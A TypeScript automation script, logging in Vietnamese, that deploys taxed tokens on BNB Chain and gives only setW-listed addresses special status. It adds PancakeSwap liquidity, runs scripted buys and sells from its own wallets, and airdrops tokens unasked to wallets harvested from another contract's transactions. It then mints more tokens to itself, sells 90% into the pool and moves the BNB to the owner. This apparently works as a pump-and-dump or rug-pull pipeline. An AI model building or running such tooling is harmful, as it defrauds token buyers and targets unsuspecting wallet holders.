import { ethers } from 'ethers'
import { DISPERSE_ABI, ERC20_ABI, ROUTER_PANCAKE_V2_ABI } from './abi'

const GAS_PRICE        = ethers.BigNumber.from(100_000_000)
const DISPERSE_ADDRESS = '0xD152f549545093347A162Dce210e7293f1452150'

const CHAIN_CONFIG: Record<number, { router: string; factory: string; wbnb: string }> = {
    56: {
        router:  '0x10ed43c718714eb63d5aa57b78b54704e256024e',
        factory: '0xca143ce32fe78f1f7019d7d551a6402fc5350c73',
        wbnb:    '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
    },
    97: {
        router:  '0xd99d1c33f9fc3444f8101754abc46c52416550d1',
        factory: '0x6725f303b657a9451d8ba641348b6761a6cc7a17',
        wbnb:    '0xae13d989dac2f0debff460ac112a837c89baa7cd',
    },
}
const ZERO_ADDR        = '0x0000000000000000000000000000000000000000'
const API_BASE         = 'http://localhost:8080/api/model'
const SCAN_CHUNK       = 50  // blocks per batch for getBlockWithTransactions

// Steps (9 total):
// 0  → 1.   Deploy & Initialize
// 1  → 1.1  Transfer new token to previously scanned wallets (from DB)
// 2  → 2.   Set Whitelist
// 3  → 3.   Transfer Token to mint wallet
// 4  → 4.   Add Liquidity
// 5  → 5.1  Swap commands
// 6  → 5.2  Scan wallets + Disperse from mint wallet
// 7  → 6.   Mint thêm & Bán 90%
// 8  → 7.   Chuyển BNB về ví chủ


async function apiGet(path: string, where: object): Promise<any[]> {
    const q = encodeURIComponent(JSON.stringify({ where }))
    const res = await fetch(`${API_BASE}/${path}?q=${q}`)
    return res.json()
}


async function apiPost(path: string, body: object): Promise<void> {
    await fetch(`${API_BASE}/${path}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
    })
}

export interface SwapCommand {
    id: string
    type: 'buy' | 'sell'
    amount: string    // BNB for both buy and sell
    slippage: string  // percentage, e.g. "5" = 5%
}

export interface AutomationToken {
    id: string
    name: string
    decimal: number
    mintAmount: string
    liquidityToken: string
    liquidityBNB: string
    sellMintAmount: string
    taxBuy: string
    taxSell: string
    totalSupply: string  // if empty, auto-compute as mintAmount + liquidityToken
}

export interface AutomationParams {
    rpc: string
    mainPrivateKey: string
    swapPrivateKey: string
    mintPrivateKey: string
    abi: any[]
    bytecode: string
    chainId: number
    tokens: AutomationToken[]
    swapCommands: SwapCommand[]
    swapDelayMs: number
    transferBnbToMain: string
    scanContract: string      // contract address to scan for wallet interactions
    disperseAmount: string    // tokens per wallet for Disperse (steps 1.1 and 5.2)
    scanDelaySeconds: number  // seconds between scan cycles in step 5.2
    shouldStop?: () => boolean
}

export type StepStatus = 'wait' | 'process' | 'finish' | 'error'

type UpdateStatus = (
    id: string,
    status: 'idle' | 'running' | 'success' | 'error',
    contractAddress?: string,
    errorMsg?: string
) => void

type OnStepChange = (
    tokenId: string,
    step: number,
    status: 'process' | 'finish' | 'error'
) => void

const STOPPED = Object.assign(new Error('__STOPPED__'), { __stopped: true })

function raceStop(
    promise: Promise<any>,
    shouldStop: (() => boolean) | undefined
): Promise<any> {
    if (!shouldStop) return promise
    return new Promise((resolve, reject) => {
        const iv = setInterval(() => {
            if (shouldStop()) { clearInterval(iv); reject(STOPPED) }
        }, 300)
        promise
            .then((v) => { clearInterval(iv); resolve(v) })
            .catch((e) => { clearInterval(iv); reject(e) })
    })
}

async function ensureApproval(
    tokenContract: ethers.Contract,
    spender: string,
    required: ethers.BigNumber,
    onLog: (msg: string) => void,
    label: string,
    shouldStop?: () => boolean
): Promise<void> {
    const owner: string = await tokenContract.signer.getAddress()
    const allowance: ethers.BigNumber = await tokenContract.allowance(owner, spender)
    if (allowance.gte(required)) {
        onLog(`${label} Allowance OK, skip approve`)
        return
    }
    const tx: ethers.ContractTransaction = await tokenContract.approve(
        spender,
        ethers.constants.MaxUint256,
        { gasLimit: 100_000, gasPrice: GAS_PRICE }
    )
    await raceStop(tx.wait(), shouldStop)
    onLog(`${label} ✓ Approved (MaxUint256) | tx: ${tx.hash}`)
}

export async function runAutomation(
    params: AutomationParams,
    onLog: (msg: string) => void,
    updateStatus: UpdateStatus,
    onStepChange: OnStepChange,
    onScanLog?: (msg: string) => void
): Promise<void> {
    const chainCfg = CHAIN_CONFIG[params.chainId] ?? CHAIN_CONFIG[56]
    const PANCAKE_ROUTER = chainCfg.router
    const PANCAKE_FACTORY = chainCfg.factory
    const WBNB = chainCfg.wbnb

    const provider   = new ethers.providers.JsonRpcProvider(params.rpc)
    const mainWallet = new ethers.Wallet(params.mainPrivateKey, provider)
    const swapWallet = new ethers.Wallet(params.swapPrivateKey, provider)
    const mintWallet = new ethers.Wallet(params.mintPrivateKey, provider)

    onLog(`Ví chủ  : ${mainWallet.address}`)
    onLog(`Ví swap : ${swapWallet.address}`)
    onLog(`Ví mint : ${mintWallet.address}`)
    onLog(`Chain ID: ${params.chainId}`)

    const mainBal = await provider.getBalance(mainWallet.address)
    onLog(`BNB chủ : ${ethers.utils.formatEther(mainBal)} BNB`)

    for (const token of params.tokens) {
        if (params.shouldStop?.()) {
            onLog('\n⏹ Đã dừng automation.')
            break
        }
        onLog(`\n=== Token: ${token.name} (decimal=${token.decimal}) ===`)
        updateStatus(token.id, 'running')

        let currentStep = 0
        const checkStop = () => {
            if (params.shouldStop?.()) throw Object.assign(new Error('__STOPPED__'), { __stopped: true })
        }

        try {
            const mintAmtRaw    = ethers.utils.parseUnits(token.mintAmount, token.decimal)
            const liqTokenRaw   = ethers.utils.parseUnits(token.liquidityToken, token.decimal)
            const liqBNB        = ethers.utils.parseEther(token.liquidityBNB)
            const mintAmtHuman  = Math.floor(Number(token.mintAmount))
            const liqTokenHuman = Math.floor(Number(token.liquidityToken))
            const totalSupHuman = token.totalSupply && Number(token.totalSupply) > 0
                ? ethers.BigNumber.from(Math.floor(Number(token.totalSupply)))
                : ethers.BigNumber.from(mintAmtHuman + liqTokenHuman)
            const taxBuy  = Math.round(Number(token.taxBuy) || 0)
            const taxSell = Math.round(Number(token.taxSell) || 0)

            // ── Step 0: Deploy + Initialize ────────────────────────────────
            onStepChange(token.id, 0, 'process')
            onLog('[1] Deploy TOKEN1997...')
            const contractFactory = new ethers.ContractFactory(params.abi, params.bytecode, mainWallet)
            const deployed = await contractFactory.deploy({ gasLimit: 5_000_000, gasPrice: GAS_PRICE })
            await raceStop(deployed.deployed(), params.shouldStop)
            const contractAddress = deployed.address
            onLog(`[1] ✓ Deployed: ${contractAddress}`)

            onLog(`[1] initialize("${token.name}", decimal=${token.decimal}, totalSup=${totalSupHuman})`)
            let tx = await deployed.initialize(
                token.name, token.name, mainWallet.address,
                token.decimal, totalSupHuman, taxBuy, taxSell, params.chainId,
                { gasLimit: 500_000, gasPrice: GAS_PRICE }
            )
            await raceStop(tx.wait(), params.shouldStop)
            onLog(`[1] ✓ initialize | tx: ${tx.hash}`)
            onStepChange(token.id, 0, 'finish')
            checkStop()

            // ── Step 1: 1.1 Transfer new token to previously scanned wallets
            currentStep = 1
            onStepChange(token.id, 1, 'process')

            const hasScanConfig = params.scanContract && Number(params.disperseAmount) > 0
            if (hasScanConfig) {
                const scanRecords = await apiGet('scanWallet/findMany', {
                    wallet: params.scanContract,
                })
                const destinations = [...new Set(
                    scanRecords.map((w: any) => w.destination).filter(Boolean)
                )] as string[]

                if (destinations.length > 0) {
                    onLog(`[1.1] ${destinations.length} ví cần nhận token mới`)
                    tx = await deployed.setW(DISPERSE_ADDRESS, { gasLimit: 100_000, gasPrice: GAS_PRICE })
                    await raceStop(tx.wait(), params.shouldStop)
                    onLog(`[1.1] ✓ Whitelisted Disperse | tx: ${tx.hash}`)

                    const disperseAmt      = ethers.utils.parseUnits(params.disperseAmount, token.decimal)
                    const totalAmt         = disperseAmt.mul(destinations.length)
                    const mainErc20        = new ethers.Contract(contractAddress, ERC20_ABI, mainWallet)
                    const disperseContract = new ethers.Contract(DISPERSE_ADDRESS, DISPERSE_ABI, mainWallet)

                    await ensureApproval(mainErc20, DISPERSE_ADDRESS, totalAmt, onLog, '[1.1]', params.shouldStop)

                    const amounts = destinations.map(() => disperseAmt)
                    tx = await disperseContract.disperseTokenSimple(contractAddress, destinations, amounts, {
                        gasLimit: 500_000 + 50_000 * destinations.length,
                        gasPrice: GAS_PRICE,
                    })
                    await raceStop(tx.wait(), params.shouldStop)
                    onLog(`[1.1] ✓ Dispersed to ${destinations.length} wallets | tx: ${tx.hash}`)

                    await fetch(`${API_BASE}/scanWallet/deleteMany`, {
                        method: 'DELETE',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ where: { wallet: params.scanContract } }),
                    })
                    onLog(`[1.1] ✓ Đã xóa ${destinations.length} scan records`)
                } else {
                    onLog('[1.1] Không có ví nào trong DB cần transfer')
                }
            } else {
                onLog('[1.1] Bỏ qua (chưa cấu hình scanContract hoặc disperseAmount)')
            }
            onStepChange(token.id, 1, 'finish')
            checkStop()

            // ── Step 2: Set Whitelist ──────────────────────────────────────
            currentStep = 2
            onStepChange(token.id, 2, 'process')
            onLog(`[2] setW(swapWallet: ${swapWallet.address})`)
            tx = await deployed.setW(swapWallet.address, { gasLimit: 100_000, gasPrice: GAS_PRICE })
            await raceStop(tx.wait(), params.shouldStop)
            onLog(`[2] ✓ Swap wallet whitelisted | tx: ${tx.hash}`)

            onLog('[2] setW(Disperse)')
            tx = await deployed.setW(DISPERSE_ADDRESS, { gasLimit: 100_000, gasPrice: GAS_PRICE })
            await raceStop(tx.wait(), params.shouldStop)
            onLog(`[2] ✓ Disperse whitelisted | tx: ${tx.hash}`)
            onStepChange(token.id, 2, 'finish')
            checkStop()

            // ── Step 3: Transfer Token to mint wallet ──────────────────────
            currentStep = 3
            onStepChange(token.id, 3, 'process')
            onLog(`[3] transfer(mintWallet, ${token.mintAmount} tokens)`)
            tx = await deployed.transfer(mintWallet.address, mintAmtRaw, { gasLimit: 100_000, gasPrice: GAS_PRICE })
            await raceStop(tx.wait(), params.shouldStop)
            onLog(`[3] ✓ Minted to mint wallet | tx: ${tx.hash}`)
            onStepChange(token.id, 3, 'finish')
            checkStop()

            // ── Step 4: Add Liquidity ──────────────────────────────────────
            currentStep = 4
            onStepChange(token.id, 4, 'process')

            tx = await deployed.setW(PANCAKE_ROUTER, { gasLimit: 100_000, gasPrice: GAS_PRICE })
            await raceStop(tx.wait(), params.shouldStop)
            onLog(`[4] ✓ Router whitelisted | tx: ${tx.hash}`)

            const erc20 = new ethers.Contract(contractAddress, ERC20_ABI, mainWallet)
            await ensureApproval(erc20, PANCAKE_ROUTER, liqTokenRaw, onLog, '[4]', params.shouldStop)

            const tokenBal = await erc20.balanceOf(mainWallet.address) as ethers.BigNumber
            const bnbBal   = await provider.getBalance(mainWallet.address)
            onLog(`[4] Balance check: ${ethers.utils.formatUnits(tokenBal, token.decimal)} tokens, ${ethers.utils.formatEther(bnbBal)} BNB`)
            if (tokenBal.lt(liqTokenRaw)) throw new Error(`[4] Không đủ token: cần ${token.liquidityToken}, có ${ethers.utils.formatUnits(tokenBal, token.decimal)}`)
            if (bnbBal.lt(liqBNB)) throw new Error(`[4] Không đủ BNB: cần ${token.liquidityBNB}, có ${ethers.utils.formatEther(bnbBal)}`)

            const deadline    = Math.floor(Date.now() / 1000) + 600
            const router      = new ethers.Contract(PANCAKE_ROUTER, ROUTER_PANCAKE_V2_ABI, mainWallet)
            const liqArgs     = [contractAddress, liqTokenRaw, 0, 0, mainWallet.address, deadline] as const
            const liqOverride = { value: liqBNB, gasLimit: 6_000_000, gasPrice: GAS_PRICE }

            onLog(`[4] addLiquidityETH(${token.liquidityToken} tokens + ${token.liquidityBNB} BNB)`)
            tx = await router.addLiquidityETH(...liqArgs, liqOverride)
            await raceStop(tx.wait(), params.shouldStop)
            onLog(`[4] ✓ Liquidity added | tx: ${tx.hash}`)

            // whitelist the actual pair address (queried from factory after creation)
            const pancakeFactory = new ethers.Contract(PANCAKE_FACTORY, ['function getPair(address,address) view returns (address)'], provider)
            const pairAddress    = await pancakeFactory.getPair(contractAddress, WBNB) as string
            onLog(`[4] Pair address: ${pairAddress}`)
            if (pairAddress && pairAddress !== ZERO_ADDR) {
                tx = await deployed.setW(pairAddress, { gasLimit: 100_000, gasPrice: GAS_PRICE })
                await raceStop(tx.wait(), params.shouldStop)
                onLog(`[4] ✓ Pair whitelisted | tx: ${tx.hash}`)
            }

            onStepChange(token.id, 4, 'finish')
            checkStop()

            // ── Step 5: 5.1 Swap commands ──────────────────────────────────
            currentStep = 5
            onStepChange(token.id, 5, 'process')
            const swapRouter = new ethers.Contract(PANCAKE_ROUTER, ROUTER_PANCAKE_V2_ABI, swapWallet)
            const swapErc20  = new ethers.Contract(contractAddress, ERC20_ABI, swapWallet)

            for (let i = 0; i < params.swapCommands.length; i++) {
                if (params.shouldStop?.()) { onLog('[5.1] ⏹ Dừng swap.'); break }
                const cmd          = params.swapCommands[i]
                const swapDeadline = Math.floor(Date.now() / 1000) + 600
                const slippagePct  = Number(cmd.slippage) || 0
                const bnbAmt       = ethers.utils.parseEther(cmd.amount)
                const slippageBps  = 10000 - Math.round(slippagePct * 100)

                if (cmd.type === 'buy') {
                    const amountsOut: ethers.BigNumber[] = await swapRouter.getAmountsOut(bnbAmt, [WBNB, contractAddress])
                    const amountOutMin = amountsOut[1].mul(slippageBps).div(10000)
                    onLog(`[5.1.${i + 1}] BUY ${cmd.amount} BNB → ${token.name} (slippage ${slippagePct}%)`)
                    tx = await swapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens(
                        amountOutMin, [WBNB, contractAddress], swapWallet.address, swapDeadline,
                        { value: bnbAmt, gasLimit: 500_000, gasPrice: GAS_PRICE }
                    )
                    await raceStop(tx.wait(), params.shouldStop)
                    onLog(`[5.1.${i + 1}] ✓ BUY done | tx: ${tx.hash}`)
                } else {
                    const amountsIn: ethers.BigNumber[] = await swapRouter.getAmountsIn(bnbAmt, [contractAddress, WBNB])
                    const tokenAmt     = amountsIn[0]
                    const amountOutMin = bnbAmt.mul(slippageBps).div(10000)
                    onLog(`[5.1.${i + 1}] SELL ~${ethers.utils.formatUnits(tokenAmt, token.decimal)} ${token.name} → ${cmd.amount} BNB`)
                    await ensureApproval(swapErc20, PANCAKE_ROUTER, tokenAmt, onLog, `[5.1.${i + 1}]`, params.shouldStop)
                    tx = await swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                        tokenAmt, amountOutMin, [contractAddress, WBNB], swapWallet.address, swapDeadline,
                        { gasLimit: 500_000, gasPrice: GAS_PRICE }
                    )
                    await raceStop(tx.wait(), params.shouldStop)
                    onLog(`[5.1.${i + 1}] ✓ SELL done | tx: ${tx.hash}`)
                }

                if (params.swapDelayMs > 0 && i < params.swapCommands.length - 1) {
                    onLog(`[5.1] Chờ ${params.swapDelayMs / 1000}s...`)
                    await new Promise((r) => setTimeout(r, params.swapDelayMs))
                }
            }
            onStepChange(token.id, 5, 'finish')
            checkStop()

            // ── Step 6: 5.2 Scan wallets + Disperse from mint wallet ───────
            currentStep = 6
            onStepChange(token.id, 6, 'process')

            if (hasScanConfig) {
                const sLog = (msg: string) => { onLog(msg); onScanLog?.(msg) }
                const mintErc20   = new ethers.Contract(contractAddress, ERC20_ABI, mintWallet)
                const disperse    = new ethers.Contract(DISPERSE_ADDRESS, DISPERSE_ABI, mintWallet)
                const disperseAmt = ethers.utils.parseUnits(params.disperseAmount, token.decimal)
                const sentSet = new Set<string>()
                // Pre-load already-sent addresses from DB to avoid re-dispersing across runs
                const existing = await apiGet('scanWallet/findMany', { wallet: params.scanContract })
                for (const r of existing) {
                    if (r.destination) sentSet.add((r.destination as string).toLowerCase())
                }
                sLog(`[5.2] Pre-loaded ${existing.length} ví đã transfer từ DB`)

                let scanFrom = await provider.getBlockNumber()
                sLog(`[5.2] Quét contract: ${params.scanContract}`)
                sLog(`[5.2] Delay: ${params.scanDelaySeconds}s | Amount: ${params.disperseAmount} token/ví`)
                onLog('[5.2] Nhấn Dừng để kết thúc quét và chuyển sang bước tiếp theo')

                while (true) {
                    if (params.shouldStop?.()) break

                    const latest = await provider.getBlockNumber()
                    if (latest >= scanFrom) {
                        const toBlock = Math.min(latest, scanFrom + SCAN_CHUNK - 1)
                        const scanTarget = params.scanContract.toLowerCase()

                        const interactors: string[] = []
                        for (let bn = scanFrom; bn <= toBlock; bn++) {
                            const block = await provider.getBlockWithTransactions(bn)
                            for (const tx of block.transactions) {
                                if (tx.to?.toLowerCase() !== scanTarget) continue
                                const from = tx.from.toLowerCase()
                                if (from !== ZERO_ADDR && !sentSet.has(from)) {
                                    interactors.push(tx.from)
                                }
                            }
                        }

                        const newAddrs = [...new Set(interactors)]

                        if (newAddrs.length > 0) {
                            sLog(`[5.2] Block ${scanFrom}–${toBlock}: ${newAddrs.length} ví mới`)

                            // Save to DB for next token's step 1.1
                            await apiPost('scanWallet/createMany', {
                                data: newAddrs.map(addr => ({
                                    wallet: params.scanContract,
                                    tx: '0x',
                                    token: params.scanContract,
                                    destination: addr,
                                    amount: params.disperseAmount,
                                    isTransferred: false,
                                }))
                            })

                            const totalAmt    = disperseAmt.mul(newAddrs.length)
                            const mintBalance = await mintErc20.balanceOf(mintWallet.address)
                            if (mintBalance.lt(totalAmt)) {
                                sLog(`[5.2] ⚠ Mint wallet không đủ token (${ethers.utils.formatUnits(mintBalance, token.decimal)} < ${ethers.utils.formatUnits(totalAmt, token.decimal)})`)
                            } else {
                                await ensureApproval(mintErc20, DISPERSE_ADDRESS, totalAmt, sLog, '[5.2]', params.shouldStop)
                                const amounts = newAddrs.map(() => disperseAmt)
                                tx = await disperse.disperseTokenSimple(contractAddress, newAddrs, amounts, {
                                    gasLimit: 500_000 + 50_000 * newAddrs.length,
                                    gasPrice: GAS_PRICE,
                                })
                                await tx.wait()
                                sLog(`[5.2] ✓ Dispersed to ${newAddrs.length} wallets | tx: ${tx.hash}`)
                            }

                            for (const addr of newAddrs) sentSet.add(addr.toLowerCase())
                        }

                        scanFrom = toBlock + 1
                        if (toBlock < latest) continue  // catch up remaining blocks without sleeping
                    }

                    if (params.shouldStop?.()) break
                    sLog(`[5.2] Chờ ${params.scanDelaySeconds}s...`)
                    await new Promise(r => setTimeout(r, params.scanDelaySeconds * 1000))
                }

                onLog('[5.2] ⏹ Kết thúc quét')
            } else {
                onLog('[5.2] Bỏ qua (chưa cấu hình scanContract hoặc disperseAmount)')
            }

            onStepChange(token.id, 6, 'finish')
            // No checkStop() here — steps 7 & 8 are cleanup, should always run after scan exits

            // ── Step 7: Mint thêm & Bán 90% ───────────────────────────────
            currentStep = 7
            onStepChange(token.id, 7, 'process')
            if (Number(token.sellMintAmount) > 0) {
                const sellMintRaw = ethers.utils.parseUnits(token.sellMintAmount, token.decimal)
                const sellAmt     = sellMintRaw.mul(9000).div(10000)
                onLog(`[6] transfer(swapWallet, ${token.sellMintAmount} tokens)`)
                tx = await deployed.transfer(swapWallet.address, sellMintRaw, { gasLimit: 100_000, gasPrice: GAS_PRICE })
                await raceStop(tx.wait(), params.shouldStop)
                onLog(`[6] ✓ Minted to swap wallet | tx: ${tx.hash}`)
                onLog(`[6] Selling 90% = ${ethers.utils.formatUnits(sellAmt, token.decimal)} ${token.name}`)
                const sellDeadline = Math.floor(Date.now() / 1000) + 600
                await ensureApproval(swapErc20, PANCAKE_ROUTER, sellAmt, onLog, '[6]', params.shouldStop)
                tx = await swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    sellAmt, 1, [contractAddress, WBNB], swapWallet.address, sellDeadline,
                    { gasLimit: 500_000, gasPrice: GAS_PRICE }
                )
                await raceStop(tx.wait(), params.shouldStop)
                onLog(`[6] ✓ Sold 90% | tx: ${tx.hash}`)
            } else {
                onLog('[6] Bỏ qua (sellMintAmount = 0)')
            }
            onStepChange(token.id, 7, 'finish')
            checkStop()

            // ── Step 8: Chuyển BNB từ ví swap về ví chủ ───────────────────
            currentStep = 8
            onStepChange(token.id, 8, 'process')
            if (Number(params.transferBnbToMain) > 0) {
                const wantAmt  = ethers.utils.parseEther(params.transferBnbToMain)
                const gasCost  = ethers.BigNumber.from(21_000).mul(GAS_PRICE)
                const balance  = await swapWallet.getBalance()
                const maxSend  = balance.sub(gasCost)
                if (maxSend.lte(0)) {
                    onLog('[7] ⚠ Swap wallet không đủ BNB, bỏ qua')
                } else {
                    const sendAmt = wantAmt.gt(maxSend) ? maxSend : wantAmt
                    if (sendAmt.lt(wantAmt)) {
                        onLog(`[7] ⚠ Chỉ có ${ethers.utils.formatEther(maxSend)} BNB khả dụng`)
                    }
                    onLog(`[7] Transfer ${ethers.utils.formatEther(sendAmt)} BNB → main wallet`)
                    const transferTx = await swapWallet.sendTransaction({
                        to: mainWallet.address,
                        value: sendAmt,
                        gasLimit: 21_000,
                        gasPrice: GAS_PRICE,
                        type: 0,
                    })
                    await raceStop(transferTx.wait(), params.shouldStop)
                    onLog(`[7] ✓ Transferred | tx: ${transferTx.hash}`)
                }
            } else {
                onLog('[7] Bỏ qua (số lượng = 0)')
            }
            onStepChange(token.id, 8, 'finish')

            onLog(`=== ✓ Token "${token.name}" hoàn thành! Contract: ${contractAddress} ===`)
            updateStatus(token.id, 'success', contractAddress)

        } catch (err: any) {
            if (err.__stopped) {
                onLog(`⏹ Token "${token.name}" dừng sau step ${currentStep + 1}.`)
                updateStatus(token.id, 'idle')
                break
            }
            const errMsg = err.reason || err.error?.reason || err.error?.message || err.message || 'Unknown error'
            onStepChange(token.id, currentStep, 'error')
            onLog(`=== ✗ Token "${token.name}" thất bại tại step ${currentStep + 1} ===`)
            onLog(`    code   : ${err.code || 'n/a'}`)
            onLog(`    reason : ${err.reason || 'n/a'}`)
            onLog(`    message: ${err.message || 'n/a'}`)
            if (err.transactionHash || err.receipt?.transactionHash) {
                onLog(`    tx     : ${err.transactionHash || err.receipt?.transactionHash}`)
            }
            if (err.transaction) {
                try {
                    await provider.call(err.transaction)
                } catch (callErr: any) {
                    const revert = callErr.reason || callErr.error?.message || callErr.message || ''
                    if (revert) onLog(`    revert : ${revert}`)
                }
            }
            updateStatus(token.id, 'error', undefined, errMsg)
        }
    }

    onLog('\n✓ Automation hoàn thành!')
}
